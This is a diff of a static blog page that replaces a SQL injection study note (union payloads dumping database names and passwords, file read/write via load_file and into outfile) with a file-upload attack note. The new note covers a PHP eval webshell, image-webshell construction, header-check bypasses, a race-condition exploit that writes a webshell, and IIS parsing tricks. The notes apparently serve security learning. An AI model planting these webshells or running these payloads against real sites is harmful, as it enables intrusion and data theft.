@@ -5,7 +5,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="web漏洞">
-    <meta name="description" content="SQL注入，mysql注入">
+    <meta name="description" content="文件上传基础">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>web-SQL注入（2） | E=MC^2</title>
+    <title>文件上传（2） | E=MC^2</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -298,12 +298,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">web-SQL注入（2）</h1>
+                    <h1 class="description center-align post-title">文件上传（2）</h1>
                 </div>
             </div>
         </div>
@@ -419,8 +419,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
-                                <span class="chip bg-color">SQL注入</span>
+                            <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+                                <span class="chip bg-color">文件上传</span>
                             </a>
                         
                     </div>
@@ -444,28 +444,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-03-02
+                    2022-03-30
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-03-14
+                    2022-03-31
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    514
+                    1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    4 分
                 </div>
                 
 
@@ -485,49 +485,128 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203021841289.png" alt="高权限注入"></p>
-<h3 id="1、权限问题"><a href="#1、权限问题" class="headerlink" title="1、权限问题"></a>1、权限问题</h3><p>（1）在对数据库进行爆库前，先进行信息收集。</p>
-<p><code>user()</code>是判断你注入数据库时的权限，如果返回的是<code>root@localhost</code>最高权限</p>
-<p>对于一些网站会将数据库设置权限。对于数据库A它只管理网站A，就算爆破了，此账号只对网页A起作用，不会影响到B网站，因为账号权限不同。但如果是root账号进行爆库，就可以跨库爆破。</p>
-<p>（2）mysql数据库的访问：<code>mysql -uroot -p</code></p>
-<p>（3）<code>information_schema.schemata</code>存储各个数据库的名字<code>schema_name</code></p>
-<h3 id="2、sqli-lab实例"><a href="#2、sqli-lab实例" class="headerlink" title="2、sqli-lab实例"></a>2、sqli-lab实例</h3><p>（1）获取此网页所有数据库的名字</p>
-<p><code>union select 1,group_concat(schema_name),3  from information_schema.schemata</code></p>
-<p><img src="C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20220313194506151.png" alt="数据库名字"></p>
-<p>（2）获取指定security数据库名下的表名信息</p>
-<p><code> union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;</code></p>
-<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203131951836.png" alt="security数据库下的表名信息"></p>
-<p>（3）获取指定security数据库下的表名users下的列名信息</p>
-<p><code>union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;</code></p>
-<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203131958871.png" alt="列名信息"></p>
-<p>（4）获取列名下面的数据</p>
-<p><code>union select 1,password,3 from security.users</code></p>
-<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203132002889.png" alt="列名下面的数据"></p>
-<h3 id="3、文件读写"><a href="#3、文件读写" class="headerlink" title="3、文件读写"></a>3、文件读写</h3><p>（1）常用函数</p>
-<p><code>load_file()</code>读取函数</p>
-<p><code>into outfile</code>或<code>into dumpfile</code>写入函数 </p>
-<p>（2）实例</p>
-<p><code>select load_file(&#39;c:/xxxxx&#39;)</code>   <code>\</code>一般会认为转义字符</p>
-<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203132010250.png" alt="文件读取"></p>
-<p><code>select &#39;x&#39; into outfile  &#39;1.txt&#39;</code></p>
-<p>若文件已存在不能用此函数进行文件写入</p>
-<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203132012806.png" alt="文件写入"></p>
-<p>（3）获取路径常见方法</p>
-<p>常见<code>load_file()</code>读取敏感信息</p>
-<p>报错显示</p>
-<p>遗留文件：<code>phpinfo.php SCRIRT_FILENAME</code></p>
-<p>漏洞报错</p>
-<p>平台配置文件（根据环境决定）</p>
-<p>爆破：<code>windows: d:/wwwroot/域名/   Linux: /var/www/域名</code></p>
-<p>（4）魔术引号</p>
-<p><code>magic_quotes_gpc</code>对双引号，反斜杠，NULL，单引号会被转义（加上反斜杠）。</p>
-<p>绕过：编码（十六进制）或宽字节绕过</p>
-<p><code>addslashes()</code>PHP内置转义函数：对双引号，反斜杠，NULL，单引号转义</p>
-<h3 id="3、注入防护"><a href="#3、注入防护" class="headerlink" title="3、注入防护"></a>3、注入防护</h3><p>（1）自带防御：魔术引号</p>
-<p>（2）内置函数：<code>int</code>或<code>addslashes()</code>等</p>
-<p><code>if (is_int($id))</code>数字无法注入</p>
-<p>（3）自定义关键字：<code>select</code>对关键字进行过滤（有时可以试试大小写）</p>
-<p>（4）waf防护软件：安全狗，宝塔等</p>
+                <h3 id="1、后端绕过"><a href="#1、后端绕过" class="headerlink" title="1、后端绕过"></a>1、后端绕过</h3><p>代码问题漏洞</p>
+<h5 id="（1）图片马的制作"><a href="#（1）图片马的制作" class="headerlink" title="（1）图片马的制作"></a>（1）图片马的制作</h5><p><code>copy 1.png /b + shell.php /a webshell.jpg</code></p>
+<p>直接在图片中插入（十六进制）<code>webshell：&lt;?php @eval($_POST[&#39;x&#39;]);?&gt;</code></p>
+<h5 id="（2）文件头检测"><a href="#（2）文件头检测" class="headerlink" title="（2）文件头检测"></a>（2）文件头检测</h5><p>一般用十六进制器修改（burpsuit抓包修改头文件）</p>
+<pre><code>JPEG (jpg)，文件头：FFD8FFE1
+PNG (png)，文件头：89504E47
+GIF (gif)，文件头：47494638
+TIFF (tif)，文件头：49492A00
+Windows Bitmap (bmp)，文件头：424D
+CAD (dwg)，文件头：41433130
+Adobe Photoshop (psd)，文件头：38425053
+Rich Text Format (rtf)，文件头：7B5C727466
+XML (xml)，文件头：3C3F786D6C
+HTML (html)，文件头：68746D6C3E
+</code></pre>
+<h5 id="（3）图像文件信息判断"><a href="#（3）图像文件信息判断" class="headerlink" title="（3）图像文件信息判断"></a>（3）图像文件信息判断</h5><p>注意检测函数，配合文件包含漏洞执行</p>
+<ul>
+<li><code>getimagesize()</code>：图片信息获取</li>
+</ul>
+<p>获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条错误信息</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$width</span><span class="token punctuation">,</span> <span class="token variable">$height</span><span class="token punctuation">,</span> <span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$attr</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token string">"runoob-logo.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"宽度为："</span> <span class="token punctuation">.</span> <span class="token variable">$width</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"高度为："</span> <span class="token punctuation">.</span> <span class="token variable">$height</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"类型为："</span> <span class="token punctuation">.</span> <span class="token variable">$type</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"属性："</span> <span class="token punctuation">.</span> <span class="token variable">$attr</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<p>也就是说出现这个函数本身就是一种过滤，若文件不是图片则会返回false</p>
+<ul>
+<li><code>exif_imagetype()</code>：图像类型判断，只接受图片</li>
+</ul>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token string">"image.gif"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">IMAGETYPE_GIF</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token keyword">echo</span> <span class="token string">"The picture is not a gif"</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<ul>
+<li><code>imagecreatefromgif()</code>：由文件或 URL 创建一个新图像</li>
+</ul>
+<p>返回一图像标识符，代表了从给定的文件名取得的图像。</p>
+<h5 id="（4）逻辑安全"><a href="#（4）逻辑安全" class="headerlink" title="（4）逻辑安全"></a>（4）逻辑安全</h5><ul>
+<li>二次渲染</li>
+</ul>
+<p>From：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45588247/article/details/119177948">https://blog.csdn.net/weixin_45588247/article/details/119177948</a></p>
+<p>网站接受目标后会再次进行操作（会对文件进行二次操作）</p>
+<p>原理：</p>
+<p>在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片并放到网站对应的标签进行显示。</p>
+<p>利用：</p>
+<p>对比要上传图片与上传后的图片大小，编辑器打开图片查看上传后保留了拿些数据，将webshell插入其中或配合条件竞争</p>
+<ul>
+<li>条件竞争</li>
+</ul>
+<p>From：<a target="_blank" rel="noopener" href="https://blog.csdn.net/mmzkyl/article/details/112318210">https://blog.csdn.net/mmzkyl/article/details/112318210</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1650655">https://cloud.tencent.com/developer/article/1650655</a></p>
+<p>形成原因：</p>
+<p>由于服务器端在处理不同用户的请求时是<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%B9%B6%E5%8F%91&spm=1001.2101.3001.7020">并发</a>进行处理的，如果对这些并发操作处理不当的话会由于一些时序问题导致一些异常情况的发生</p>
+<pre class=" language-php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'jpg'</span><span class="token punctuation">,</span><span class="token string">'png'</span><span class="token punctuation">,</span><span class="token string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$upload_file</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$file_name</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+             <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'/'</span><span class="token punctuation">.</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>
+             <span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+             <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>
+            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>
+            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>
+        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+</code></pre>
+<p>代码逻辑：</p>
+<p>​    <strong>先通过move_uploaded_file(tempfile,upload_file)将文件上传至服务器中。</strong></p>
+<p>​    上传完毕后通过in_array(fileext,ext_arr)检查文件名后缀</p>
+<p>​    如果后缀名合法，则对文件进行重命名，上传完成</p>
+<p>​    如果后缀名非法，则删除文件。</p>
+<p>若将将一句话木马写入文件直接上传，然后通过蚁剑连接的想法还是将其打消了吧，可能蚁剑还没连上或者刚连上，一句话木马文件就被删除了</p>
+<p>利用方法：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token variable">$file</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"xxx.php"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$string</span><span class="token operator">=</span><span class="token string">'&lt;?php @eval($_POST["x"]); ?>'</span><span class="token punctuation">;</span>
+    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fcolse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<p>可以通过条件竞争的方式在unlink之前，访问webshell。用burp中不断发送上传webshell的数据包然后不断在浏览器中访问，可以通过竞争访问到文件。</p>
+<h5 id="（5）目录命名-数组接收"><a href="#（5）目录命名-数组接收" class="headerlink" title="（5）目录命名+数组接收"></a>（5）目录命名+数组接收</h5><p>伪造成文件夹上传，但成功后会以文件的形式保存</p>
+<pre><code>UPLOAD_PATH . &#39;/&#39; . $file_name;
+upload/upload-19.php/.jpg
+upload/upload-19.php/.  ：成功上传后:upload-19.php
+
+xiaodi.jpg
+x[0]=xiaodi
+x[1]=  .
+x[2]=jpg
+</code></pre>
+<h5 id="（6）CVE漏洞"><a href="#（6）CVE漏洞" class="headerlink" title="（6）CVE漏洞"></a>（6）CVE漏洞</h5><p>CVE-2015-5254、CVE-2017-12615、CVE-2019-2618</p>
+<h3 id="2、解析漏洞"><a href="#2、解析漏洞" class="headerlink" title="2、解析漏洞"></a>2、解析漏洞</h3><p>搭建平台漏洞</p>
+<p>（1）IIS</p>
+<pre><code>IIS6.0
+//文件夹
+image/qq.jpg
+image.asp/qq.jpg    qq.jpg会被当做asp解析
+//文件
+image.jpg
+image.asp;.jpg或xxx.asp;xxx.jpg 
+//文件会被当做asp执行
+eg:/x.asp;.1.jpg 实际执行asp文件
+</code></pre>
+<p>（2）Apache</p>
+<p>（3）Nginx</p>
 
                 
             </div>
@@ -554,7 +633,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/03/02/web-SQL%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/">http://example.com/2022/03/02/web-SQL%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/</a>
+                    <a href="http://example.com/2022/03/30/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%882%EF%BC%89/">http://example.com/2022/03/30/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%882%EF%BC%89/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -592,8 +671,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
-                                    <span class="chip bg-color">SQL注入</span>
+                                <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+                                    <span class="chip bg-color">文件上传</span>
                                 </a>
                             
                         </div>
@@ -639,46 +718,48 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/03/12/php%E5%9F%BA%E7%A1%80/">
+                <a href="/2022/03/30/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%882%EF%BC%89/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="php基础">
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="文件上传（2）">
                         
-                        <span class="card-title">php基础</span>
+                        <span class="card-title">文件上传（2）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            PHP基础
+                            文件上传基础
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-12
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-30
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/PHP/" class="post-category">
-                                    PHP
+                            <a href="/categories/%E5%B0%8F%E8%BF%AA%E6%B8%97%E9%80%8F/" class="post-category">
+                                    小迪渗透
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/PHP/">
-                        <span class="chip bg-color">PHP</span>
+                    <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+                        <span class="chip bg-color">文件上传</span>
                     </a>
                     
                 </div>
@@ -692,24 +773,24 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/03/01/CTF-show-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
+                <a href="/2022/03/29/CTF-show-%E7%88%86%E7%A0%B4/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="CTF-show-信息收集">
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="CTF-show-爆破">
                         
-                        <span class="card-title">CTF-show-信息收集</span>
+                        <span class="card-title">CTF-show-爆破</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            CTF-show(web1-web17)
+                            CTF-show(web21-web28)
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-01
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-29
                             </span>
                         <span class="publish-author">
                             
@@ -726,8 +807,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
-                        <span class="chip bg-color">信息收集</span>
+                    <a href="/tags/%E7%88%86%E7%A0%B4/">
+                        <span class="chip bg-color">爆破</span>
                     </a>
                     
                 </div>
